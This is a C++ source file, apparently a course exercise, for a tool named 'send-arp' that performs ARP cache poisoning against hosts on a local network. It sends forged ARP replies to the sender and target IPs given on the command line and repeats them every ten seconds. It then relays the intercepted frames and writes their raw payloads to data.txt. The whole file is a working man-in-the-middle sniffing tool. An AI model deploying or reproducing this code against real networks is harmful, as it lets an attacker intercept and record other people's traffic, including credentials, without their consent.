#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <map>
#include <cstdlib>
#include <string>
#include <cstdbool>
#include <ifaddrs.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <cstring>
#include <vector>
#include <thread>
#include <time.h>
#include <utility>

#define TIMEOUT (1000)

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

char*        device;
Mac          localMac;
Ip           localIp;
map<Ip, Mac> dataMap;
map<Mac, Ip> dataMapReverse;
vector<Ip>   tarIp1, tarIp2;
vector<Mac>  tarMac1, tarMac2;

void mySleep(int second) {
    clock_t startClk = clock();

    second--;
    while (1) {
        if ((clock() - startClk) / CLOCKS_PER_SEC > second) break;
    }
}

void printIp(FILE* fp, Ip ip){
    uint32_t ips = (uint32_t)ip;
    for(int i=0;i<4;i++) fprintf(fp, "%d.", (ips>>(8*(3-i))) & 0x000000FF);
}
void printMac(FILE* fp, Mac mac){
    uint8_t* macs = (uint8_t*)mac;
    for(int i=0;i<6;i++) fprintf(fp, "%x:", macs[i]);
}

void getLocalIp() {
    struct ifaddrs *ifaddr, *ifa;
    char ip[100];

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        return;
    }

    for (ifa = ifaddr; ifa != nullptr; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == nullptr) {
            continue;
        }

        if (ifa->ifa_addr->sa_family == AF_INET) { // AF_INET for IPv4
            void *addr = &((struct sockaddr_in *)ifa->ifa_addr)->sin_addr;

            // Convert the IP to a string
            if (inet_ntop(AF_INET, addr, ip, 32) == nullptr) {
                perror("inet_ntop");
                return;
            }
            if(!strcmp(ifa->ifa_name, device)){
                localIp = Ip(ip);
                freeifaddrs(ifaddr);
                return;
            }
        }
    }

    freeifaddrs(ifaddr);
    printf("[error] error in geting ip");
}


void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void sendArp(Mac smac, Mac dmac, Ip sip, Ip tip, uint16_t mode){ // mode: ArpHdr::Reply, ArpHdr::Request
    EthArpPacket packet;
    char         errbuf[PCAP_ERRBUF_SIZE];
    pcap_t*      handle = pcap_open_live(device, 0, 0, 0, errbuf);

    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", device, errbuf);
        exit(-1);
    }

    packet.eth_.dmac_ = dmac;
    packet.eth_.smac_ = smac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    if(dmac.isBroadcast()){
        dmac = Mac::nullMac();
    }

    packet.arp_.hrd_  = htons(ArpHdr::ETHER);
    packet.arp_.pro_  = htons(EthHdr::Ip4);
    packet.arp_.hln_  = Mac::SIZE;
    packet.arp_.pln_  = Ip::SIZE;
    packet.arp_.op_   = htons(mode);
    packet.arp_.smac_ = smac;
    packet.arp_.sip_  = htonl(sip);
    packet.arp_.tmac_ = dmac;
    packet.arp_.tip_  = htonl(tip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    pcap_close(handle);
}

void sendPacket(EthHdr eth, const u_char* data, uint32_t start, uint32_t end){
    char    packet[1501] = {};
    char    errbuf[PCAP_ERRBUF_SIZE];
    EthHdr* ethhdr = (EthHdr*) packet;
    pcap_t* handle = pcap_open_live(device, 0, 0, 0, errbuf);

    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", device, errbuf);
        exit(-1);
    }
    
    ethhdr->dmac_  = eth.dmac_;
    ethhdr->smac_  = eth.smac_;
    ethhdr->type_  = eth.type_;

    for(int i = 0; i<end-start; i++){
        packet[i+sizeof(EthHdr)] = data[i+start];
    }

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), end-start);
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    pcap_close(handle);
}

void getLocalMac(){
    // https://stackoverflow.com/questions/1779715/how-to-get-mac-address-of-your-machine-using-a-c-program
    string target = string("/sys/class/net/") + string(device) + string("/address");
    char   lmac[] = "00:00:00:00:00:00";

    FILE *fp = fopen(target.c_str(), "r");
    if(fp == nullptr){
        char errbuf[PCAP_ERRBUF_SIZE];
        fprintf(stderr, "couldn't open device %s(%s)\n", device, errbuf);
        exit(-1);
    }

    fscanf(fp, "%s", lmac);
    localMac = Mac(lmac);

    printf("local mac address: %s\n", lmac);
    fclose(fp);
}

void getMacFromArp(Ip tip, Ip usingip){
    if(dataMap.find(tip) != dataMap.end()) return;
    const u_char* data;
    pcap_pkthdr*  temp;
    char          errbuf[PCAP_ERRBUF_SIZE];
    pcap_t*       handle = pcap_open_live(device, BUFSIZ, 1, TIMEOUT, errbuf);

    while(1){
        sendArp(localMac, Mac::broadcastMac(), usingip, tip, ArpHdr::Request);
        if (handle == nullptr) {
            fprintf(stderr, "couldn't open device %s(%s)\n", device, errbuf);
            exit(-1);
        }

        int res = pcap_next_ex(handle, &temp, &data);
        if(res==0){
            continue;
        }
        if(res==-1 || res==-2){
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        EthArpPacket* packetPtr = (EthArpPacket*)data;

        if(packetPtr->eth_.type_ != htons(EthHdr::Arp))     continue;
        if(packetPtr->arp_.op_   != htons(ArpHdr::Reply))   continue;
        if(packetPtr->arp_.sip_  != htonl(tip))             continue;

        dataMap.insert( { Ip(ntohl(packetPtr->arp_.sip_)), Mac(packetPtr->arp_.smac()) } );
        dataMapReverse.insert( { Mac(packetPtr->arp_.smac()), Ip(ntohl(packetPtr->arp_.sip_)) } );
        break;
    }
    pcap_close(handle);
}

void sendArpAttack(Ip sip, Ip tip) {
    for(int i=0;i<1;i++)
        sendArp(localMac, dataMap[sip], tip, sip, ArpHdr::Reply);
}

int checkInList(Ip sip, Ip tip) {
    for(int i=0; i<tarIp1.size(); i++){
        if(tarIp1[i] == sip && tarIp2[i] == tip){
            return i;
        }
    }
    return -1;
}

int checkInListMac(Mac src){
    for(int i=0; i<tarMac1.size(); i++){
        if(tarMac1[i] == src) return i;
    }
    return -1;
}

void searchNetwork(pcap_t* handle) {
    const u_char* data;
    pcap_pkthdr*  header;

    int res = pcap_next_ex(handle, &header, &data);
    if(res==0){
        pcap_close(handle);
        return;
    }
    if(res==-1 || res==-2){
        printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
        exit(0);
    }

    EthArpPacket* packetPtr = (EthArpPacket*)data;

    if(packetPtr->eth_.type_ == htons(EthHdr::Arp)) {
        Ip sip = ntohl(packetPtr->arp_.sip_);
        Ip tip = ntohl(packetPtr->arp_.tip_);

        if(packetPtr->arp_.op_ == htons(ArpHdr::Reply)) return;
        
        if(checkInList(sip, tip) != -1){
            sendArpAttack(sip, tip);
        }
        swap(sip, tip);

        if(checkInList(sip, tip) != -1){
            sendArpAttack(sip, tip);
        }
    }
    else {
        EthHdr* packetPtr = (EthHdr*)data;
        if(packetPtr->dmac_ != localMac) return;
        int idx = checkInListMac(packetPtr->smac_);
        if(idx == -1) return;

        packetPtr->dmac_ = tarMac2[idx];

        FILE *fp = fopen("data.txt", "a");
        printIp(fp, dataMapReverse[packetPtr->smac_]);
        fprintf(fp, " to ");
        printIp(fp, dataMapReverse[packetPtr->dmac_]);
        fprintf(fp, "\n");

        packetPtr->smac_ = localMac;

        for(uint32_t i=sizeof(EthHdr); i<(header->len); i++){
            fprintf(fp, "%c", data[i]);
        }

        fprintf(fp, "\n------------------------------------\n");

        fclose(fp);
        for(uint32_t i=sizeof(EthHdr); i<(header->len); i+= 1500-sizeof(EthHdr)){
            sendPacket(*packetPtr, data, i, min(header->len, (uint32_t)(i+1500-sizeof(EthHdr))));
        }
    }
}

void attackArpAll() {
    for(int i=0; i<tarIp1.size(); i++) {
        for(int i=0;i<1;i++)
            sendArpAttack(tarIp1[i], tarIp2[i]);
    }
}

void attackArpAllProc() {
    while (true) {
        mySleep(10);
        attackArpAll();
    }
}

int main(int argc, char* argv[]) {
    if (argc <= 3 || argc % 2 == 1) {
        usage();
        return -1;
    }
    device = argv[1];

    getLocalMac();
    getLocalIp();

    for(int i=2; i<argc; i+=2) {
        tarIp1.push_back(Ip(argv[i]));
        tarIp2.push_back(Ip(argv[i+1]));
    }

    printf("[DEBUG] Processing ARP Attack\n");
    FILE *fp = fopen("data.txt", "w");
    fclose(fp);

    for(int i=0; i<tarIp1.size(); i++) {
        getMacFromArp(tarIp1[i], localIp);
        getMacFromArp(tarIp2[i], localIp);

        tarMac1.push_back(dataMap[tarIp1[i]]);
        tarMac2.push_back(dataMap[tarIp2[i]]);

        FILE *fp = fopen("data.txt", "a");
        printIp(fp, tarIp1[i]); fprintf(fp, " "); printMac(fp, tarMac1[i]); fprintf(fp, "\n");
        printIp(fp, tarIp2[i]); fprintf(fp, " "); printMac(fp, tarMac2[i]); fprintf(fp, "\n");
        fclose(fp);

        for(int i=0;i<3;i++)
            sendArpAttack(tarIp1[i], tarIp2[i]);
    }
    thread arp(attackArpAllProc);
    
    printf("[DEBUG] Processing Getting Packet\n");
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(device, BUFSIZ, 1, TIMEOUT, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", device, errbuf);
        exit(-1);
    }
    while (true) {
        searchNetwork(handle);
    }
    
    
    return 0;
}
